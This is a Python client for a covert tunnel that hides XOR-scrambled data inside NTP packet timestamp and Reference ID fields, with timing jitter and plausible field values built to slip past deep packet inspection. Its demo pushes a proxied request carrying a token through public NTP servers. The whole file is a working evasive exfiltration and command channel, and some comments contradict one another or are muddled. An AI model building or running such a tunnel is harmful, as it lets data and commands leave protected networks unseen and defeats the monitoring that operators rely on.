#!/usr/bin/env python3
"""
NTP tunnel — client

Architecture
────────────
• Hides payload in Reference ID + Ref/Orig/TX timestamp fields (28 bytes/pkt).
• 32-bit XOR encoding on BOTH send and receive paths using tunnel_core.
• Server pool: up to 100 NTP servers, weighted round-robin (same pattern as DNS).
• Transport: UDP/123 (RFC 5905 standard) + TCP/123 fallback.
• Send delay: uniform random 5–30 ms between packets in a burst.
• Inter-burst delay: Gaussian(mean=64s, std=8s) to match real NTP poll behaviour.
• Plausible timestamp values enforced so DPI can't flag invalid NTP fields.
• Receive path: server hides reply in NTP response timestamp fields;
  client 32-bit decodes the complete reply across multiple response packets.
"""

import os, sys, time, random, struct, socket, threading, secrets, hashlib
from dataclasses import dataclass, field
from typing      import Dict, List, Optional, Tuple
from tunnel_core import (
    derive_key_stream, encode_payload, decode_labels,
    ntp_encode_chunk, ntp_decode_chunk,
    b32enc, b32dec, frame, deframe, NTP_COVERT_BYTES,
)

# ─── config ──────────────────────────────────────────────────────────────────
DEFAULT_NTP_SERVERS = [
    ("127.0.0.1", 123),
    ("pool.ntp.org", 123),
]
SEND_DELAY_MS_MIN  =   5    # ms between packets in a burst
SEND_DELAY_MS_MAX  =  30
POLL_JITTER_MEAN_S =  64.0  # seconds — NTP poll interval (RFC 5905 default)
POLL_JITTER_STD_S  =   8.0
RECV_POLL_DELAY_MS =  50    # ms between receive-poll attempts
RECV_MAX_POLLS     =  60
NTP_EPOCH          = 2208988800   # NTP era 0 offset from Unix epoch
NTP_PORT           = 123


# ─── NTP server pool ──────────────────────────────────────────────────────────

@dataclass
class NTPServer:
    host:     str
    port:     int   = 123
    failures: int   = 0
    last_ok:  float = field(default_factory=time.time)

    @property
    def weight(self) -> float:
        return max(0.05, 1.0 / (1 + self.failures))

    def mark_ok(self):
        self.failures = max(0, self.failures - 1)
        self.last_ok  = time.time()

    def mark_fail(self):
        self.failures = min(self.failures + 1, 10)


class NTPServerPool:
    """Thread-safe weighted pool of up to 100 NTP servers."""

    def __init__(self, servers: List[Tuple[str, int]]):
        self._lock = threading.Lock()
        self._pool = [NTPServer(h, p) for h, p in servers[:100]]

    def add(self, host: str, port: int = 123):
        with self._lock:
            if len(self._pool) < 100:
                self._pool.append(NTPServer(host, port))

    def pick(self) -> NTPServer:
        with self._lock:
            weights = [s.weight for s in self._pool]
            total   = sum(weights)
            r       = random.uniform(0, total)
            cumul   = 0.0
            for srv, w in zip(self._pool, weights):
                cumul += w
                if r <= cumul:
                    return srv
            return self._pool[-1]

    def __len__(self):
        with self._lock:
            return len(self._pool)


# ─── NTP packet constants ─────────────────────────────────────────────────────

# Standard 48-byte NTP packet layout:
#  0     : LI(2) | VN(3) | Mode(3)
#  1     : Stratum
#  2     : Poll (log2 seconds)
#  3     : Precision (signed log2 seconds)
#  4-7   : Root Delay
#  8-11  : Root Dispersion
#  12-15 : Reference ID              ← 4 covert bytes  (session header)
#  16-23 : Reference Timestamp       ← 8 covert bytes  (chunk data 0-7)
#  24-31 : Originate Timestamp       ← 8 covert bytes  (chunk data 8-15)
#  32-39 : Receive Timestamp         ← legitimate (near-current time)
#  40-47 : Transmit Timestamp        ← 4 covert bytes  (chunk data 16-19)
#
# Total covert bytes per packet: 4 + 8 + 8 + (4 from TX) = 24 bytes usable,
# but we use 20 (NTP_COVERT_BYTES) to stay within 5 × 32-bit blocks and
# leave the TX seconds as a plausible current time.


# ─── timestamp helpers ───────────────────────────────────────────────────────

def _unix_to_ntp(t: float) -> Tuple[int, int]:
    """Convert Unix float → (NTP seconds, NTP fraction)."""
    secs = int(t) + NTP_EPOCH
    frac = int((t % 1.0) * (2**32))
    return secs, frac

def _plausible_ref_ts() -> Tuple[int, int]:
    """Reference timestamp = last sync, 10–90 s ago."""
    return _unix_to_ntp(time.time() - random.uniform(10, 90))

def _plausible_orig_ts() -> Tuple[int, int]:
    """Originate timestamp = a few milliseconds ago."""
    return _unix_to_ntp(time.time() - random.uniform(0.001, 0.008))


# ─── session ──────────────────────────────────────────────────────────────────

@dataclass
class NTPSession:
    session_id:   bytes = field(default_factory=lambda: secrets.token_bytes(6))
    key_stream:   bytes = field(init=False)
    block_offset: int   = 0     # advances per burst so TX and RX keys don't overlap

    def __post_init__(self):
        self.key_stream = derive_key_stream(self.session_id, 8192)

    @property
    def sid_hex(self) -> str:
        return self.session_id.hex()

    @property
    def sid4(self) -> bytes:
        """First 4 bytes used in NTP Reference ID covert field."""
        return self.session_id[:4]


# ─── NTP packet builder (TX — client → server) ───────────────────────────────

def build_covert_request(
    sess:    NTPSession,
    seq:     int,
    total:   int,
    payload: bytes,          # exactly NTP_COVERT_BYTES raw data bytes
) -> bytes:
    """
    Build a 48-byte NTP client request (Mode=3, VN=4) carrying covert data.

    Layout of covert fields:
      RefID[0:2]  = seq  (XOR'd with key to look random)
      RefID[2:4]  = total (XOR'd with key)
      Ref[0:8]    = covert chunk bytes 0-7   (XOR'd)
      Orig[0:8]   = covert chunk bytes 8-15  (XOR'd)
      TX[0:4]     = covert chunk bytes 16-19 (XOR'd) — TX seconds overwritten
      TX[4:8]     = current fractional time  (plausible)
      RX[0:8]     = current time             (legitimate, not overwritten)
    """
    # 32-bit encode the 20-byte chunk
    enc = ntp_encode_chunk(payload, sess.key_stream, sess.block_offset)

    # Reference ID: encode seq+total using first 4 key bytes at offset -1
    # (use a dedicated slot before block_offset to avoid collision)
    meta_key = sess.key_stream[max(0, sess.block_offset - 1) * 4 :
                               max(0, sess.block_offset - 1) * 4 + 4]
    ref_id = bytes([
        (seq   >> 8 & 0xFF) ^ meta_key[0],
        (seq        & 0xFF) ^ meta_key[1],
        (total >> 8 & 0xFF) ^ meta_key[2],
        (total      & 0xFF) ^ meta_key[3],
    ])

    # Timestamps
    ref_s,  ref_f  = _plausible_ref_ts()
    orig_s, orig_f = _plausible_orig_ts()
    now_s,  now_f  = _unix_to_ntp(time.time())
    rx_s,   rx_f   = _unix_to_ntp(time.time() - random.uniform(0.0001, 0.0005))

    # Overwrite covert fields with 32-bit encoded data
    # enc[0:8]   → Ref Timestamp seconds + fraction
    # enc[8:16]  → Orig Timestamp seconds + fraction
    # enc[16:20] → TX Timestamp seconds (4 bytes); TX fraction stays plausible
    ref_covert_s,  ref_covert_f  = struct.unpack("!II", enc[0:8])
    orig_covert_s, orig_covert_f = struct.unpack("!II", enc[8:16])
    tx_covert_s                  = struct.unpack("!I",  enc[16:20])[0]

    li_vn_mode = (0 << 6) | (4 << 3) | 3    # LI=0 VN=4 Mode=3(client)
    stratum    = 0                            # unspecified (client default)
    poll_exp   = 6                            # 2^6 = 64s
    precision  = 0xEC                        # ~250µs

    pkt  = struct.pack("!BBBB", li_vn_mode, stratum, poll_exp, precision)
    pkt += struct.pack("!II", 0x00000100, 0x00000100)   # root delay/dispersion
    pkt += ref_id
    pkt += struct.pack("!II", ref_covert_s,  ref_covert_f)
    pkt += struct.pack("!II", orig_covert_s, orig_covert_f)
    pkt += struct.pack("!II", rx_s,   rx_f)     # RX = legitimate current time
    pkt += struct.pack("!II", tx_covert_s, now_f)  # TX sec covert, frac plausible
    assert len(pkt) == 48
    return pkt


# ─── transport: UDP with TCP fallback ─────────────────────────────────────────

def _send_udp_ntp(pkt: bytes, srv: NTPServer) -> Optional[bytes]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3.0)
        s.sendto(pkt, (srv.host, srv.port))
        resp, _ = s.recvfrom(1024)
        s.close()
        return resp
    except Exception:
        return None

def _send_tcp_ntp(pkt: bytes, srv: NTPServer) -> Optional[bytes]:
    """
    NTP over TCP/123.
    RFC 5905 §16 allows TCP; frame with 2-byte length prefix (same as DNS TCP).
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((srv.host, srv.port))
        framed = struct.pack("!H", len(pkt)) + pkt
        s.sendall(framed)
        raw_len = s.recv(2)
        if len(raw_len) < 2:
            s.close()
            return None
        rlen = struct.unpack("!H", raw_len)[0]
        resp = b""
        while len(resp) < rlen:
            d = s.recv(rlen - len(resp))
            if not d:
                break
            resp += d
        s.close()
        return resp if len(resp) == rlen else None
    except Exception:
        return None

def send_ntp_packet(
    pkt:      bytes,
    pool:     NTPServerPool,
    use_tcp:  bool = False,
) -> Optional[bytes]:
    """
    Send one NTP packet, applying ms-range jitter before send.
    UDP first; if that fails, retry via TCP.
    """
    delay_ms = random.uniform(SEND_DELAY_MS_MIN, SEND_DELAY_MS_MAX)
    time.sleep(delay_ms / 1000.0)

    srv  = pool.pick()
    resp = None

    if not use_tcp:
        resp = _send_udp_ntp(pkt, srv)
        if resp is None:
            srv.mark_fail()
            srv2 = pool.pick()
            resp = _send_udp_ntp(pkt, srv2)
            if resp:
                srv2.mark_ok()
            else:
                use_tcp = True   # UDP failed on both tries, fall back to TCP

    if use_tcp:
        resp = _send_tcp_ntp(pkt, srv)
        if resp is None:
            srv.mark_fail()
            srv2 = pool.pick()
            resp = _send_tcp_ntp(pkt, srv2)
            if resp:
                srv2.mark_ok()

    if resp is not None:
        srv.mark_ok()
    else:
        srv.mark_fail()

    return resp


# ─── SEND: data → NTP burst ───────────────────────────────────────────────────

def send_payload(
    data:    bytes,
    pool:    NTPServerPool,
    session: Optional[NTPSession] = None,
) -> Tuple[NTPSession, List[bytes]]:
    """
    Encode `data` using 32-bit XOR and transmit as a burst of NTP packets.
    Returns (session, [response_bytes, ...]) for use in decode_replies.

    Encoding:
      1. encode_payload(data, key_stream, block_offset) → labels
      2. For each label: Base32dec → 4 bytes, pack 5 consecutive → 20-byte chunk
      3. ntp_encode_chunk(chunk, key, offset) → 20 scrambled bytes
      4. Embed in NTP covert fields
    """
    if session is None:
        session = NTPSession()

    # 32-bit encode for TX
    labels = encode_payload(data, session.key_stream, session.block_offset)
    n      = len(labels)

    # Pack labels into 20-byte NTP chunks (5 labels × 4 bytes = 20 bytes)
    LABELS_PER_PKT = 5
    chunks: List[Tuple[int, bytes]] = []  # (seq, 20_raw_bytes)
    for pkt_idx in range(0, n, LABELS_PER_PKT):
        pkt_labels = labels[pkt_idx : pkt_idx + LABELS_PER_PKT]
        raw = b""
        for lbl in pkt_labels:
            try:
                raw += b32dec(lbl)
            except Exception:
                raw += b"\x00" * 4
        # pad to 20 bytes
        if len(raw) < NTP_COVERT_BYTES:
            raw += os.urandom(NTP_COVERT_BYTES - len(raw))
        chunks.append((pkt_idx // LABELS_PER_PKT, raw[:NTP_COVERT_BYTES]))

    total_pkts = len(chunks)
    print(f"[NTP] TX sid={session.sid_hex} labels={n} pkts={total_pkts} "
          f"block_off={session.block_offset}")

    responses = []
    for seq, chunk_data in chunks:
        pkt  = build_covert_request(session, seq, total_pkts, chunk_data)
        resp = send_ntp_packet(pkt, pool)
        if resp and len(resp) == 48:
            responses.append(resp)

    # advance block_offset past all TX labels
    session.block_offset += n
    print(f"[NTP] TX done — {len(responses)}/{total_pkts} responses received")
    return session, responses


# ─── RECEIVE: decode reply from NTP responses ─────────────────────────────────

def decode_replies(
    responses: List[bytes],
    session:   NTPSession,
    total_expected: Optional[int] = None,
) -> Optional[bytes]:
    """
    Decode covert data from NTP server response packets.

    The server hides reply chunks in the same covert fields (RefID, Ref, Orig, TX).
    We extract them, 32-bit decode, and reassemble.

    If responses is empty or insufficient, poll the server with bare NTP queries
    to collect more responses (up to RECV_MAX_POLLS attempts).
    """
    collected: Dict[int, bytes] = {}   # seq → 20-byte raw chunk

    def _extract_chunk(resp: bytes) -> Optional[Tuple[int, int, bytes]]:
        """Extract (seq, total, raw20) from an NTP response packet."""
        if len(resp) < 48:
            return None
        ref_id  = resp[12:16]
        ref_ts  = resp[16:24]
        orig_ts = resp[24:32]
        tx_ts   = resp[40:48]

        # Server encodes seq+total in RefID using the reply key
        # (mirrored from server: same key stream, same offset logic)
        rx_blk_off = session.block_offset    # replies start here
        meta_key   = session.key_stream[max(0, rx_blk_off - 1) * 4 :
                                        max(0, rx_blk_off - 1) * 4 + 4]
        seq   = ((ref_id[0] ^ meta_key[0]) << 8) | (ref_id[1] ^ meta_key[1])
        total = ((ref_id[2] ^ meta_key[2]) << 8) | (ref_id[3] ^ meta_key[3])

        if total == 0 or seq >= total or total > 4096:
            return None

        raw20 = ref_ts + orig_ts + tx_ts[:4]   # 8+8+4 = 20 bytes
        return seq, total, raw20

    # Process provided responses first
    total_pkts = None
    for resp in responses:
        result = _extract_chunk(resp)
        if result:
            seq, tot, raw20 = result
            collected[seq] = raw20
            total_pkts = tot

    # If not complete, send bare poll packets to get remaining chunks
    if total_pkts is None or len(collected) < total_pkts:
        from tunnel_core import NTP_COVERT_BYTES as _ncb
        poll_pool = NTPServerPool(DEFAULT_NTP_SERVERS)  # use defaults for poll
        for attempt in range(RECV_MAX_POLLS):
            if total_pkts and len(collected) >= total_pkts:
                break
            time.sleep(RECV_POLL_DELAY_MS / 1000.0)
            # Send a minimal NTP client request (no covert data) to prompt reply
            bare_pkt = _build_bare_ntp_request()
            resp = send_ntp_packet(bare_pkt, poll_pool)
            if resp:
                result = _extract_chunk(resp)
                if result:
                    seq, tot, raw20 = result
                    collected[seq] = raw20
                    total_pkts = tot

    if not collected:
        return None

    # Reassemble ordered raw chunks → packed labels
    ordered_chunks = [collected[k] for k in sorted(collected.keys())]

    # Each 20-byte raw chunk holds 5 × 4-byte blocks = 5 Base32 labels
    # 32-bit decode: XOR each chunk, then unpack to labels, then decode_labels
    all_labels: List[str] = []
    for pkt_idx, raw20 in enumerate(ordered_chunks):
        block_off = session.block_offset + pkt_idx * 5
        plain20   = ntp_decode_chunk(raw20, session.key_stream, block_off)
        for j in range(0, 20, 4):
            all_labels.append(b32enc(plain20[j : j + 4]))

    # Now apply decode_labels which will Base32-dec + XOR again at the right offset
    # Wait — the data is already XOR'd back above; we just need to deframe
    # Actually: ntp_decode_chunk already reversed the XOR. The labels now hold
    # plaintext 4-byte blocks. We need to reassemble them and deframe.
    raw_plain = b""
    for lbl in all_labels:
        try:
            raw_plain += b32dec(lbl)
        except Exception:
            raw_plain += b"\x00" * 4

    result = deframe(raw_plain)
    # advance block_offset past the RX labels
    session.block_offset += len(all_labels)
    return result if result else None


def _build_bare_ntp_request() -> bytes:
    """Build a standard NTP client request with no covert payload."""
    now_s, now_f = _unix_to_ntp(time.time())
    li_vn_mode   = (0 << 6) | (4 << 3) | 3
    pkt  = struct.pack("!BBBB", li_vn_mode, 0, 6, 0xEC)
    pkt += struct.pack("!II", 0, 0)          # root delay / dispersion
    pkt += b"\x00" * 4                       # ref ID
    pkt += struct.pack("!II", 0, 0)          # ref timestamp
    pkt += struct.pack("!II", 0, 0)          # orig timestamp
    pkt += struct.pack("!II", 0, 0)          # rx timestamp
    pkt += struct.pack("!II", now_s, now_f)  # tx timestamp
    return pkt


# ─── inter-burst jitter ──────────────────────────────────────────────────────

def poll_interval() -> float:
    """Return a Gaussian-distributed poll interval in seconds."""
    return max(1.0, random.gauss(POLL_JITTER_MEAN_S, POLL_JITTER_STD_S))


# ─── demo / entry point ──────────────────────────────────────────────────────

DEFAULT_NTP_SERVERS = [
    ("127.0.0.1", 123),
]

if __name__ == "__main__":
    pool = NTPServerPool(DEFAULT_NTP_SERVERS)

    # Add more servers to demonstrate pool
    for h in ["pool.ntp.org", "time.cloudflare.com", "time.google.com"]:
        pool.add(h, 123)
    print(f"[NTP] Server pool: {len(pool)} servers")

    data = (
        b"CONNECT internal.corp:443 HTTP/1.1\r\n"
        b"Host: internal.corp\r\n"
        b"X-Token: supersecret\r\n\r\n"
    ) * 3

    sess = NTPSession()
    print(f"\n[NTP] Sending {len(data)} bytes — session {sess.sid_hex}")

    sess, responses = send_payload(data, pool, sess)
    print(f"[NTP] TX complete, block_offset={sess.block_offset}")

    print("[NTP] Decoding replies...")
    reply = decode_replies(responses, sess)
    if reply:
        print(f"[NTP] RX reply: {len(reply)} bytes — {reply[:80]!r}")
    else:
        print("[NTP] No reply decoded (server not running — expected in standalone demo)")
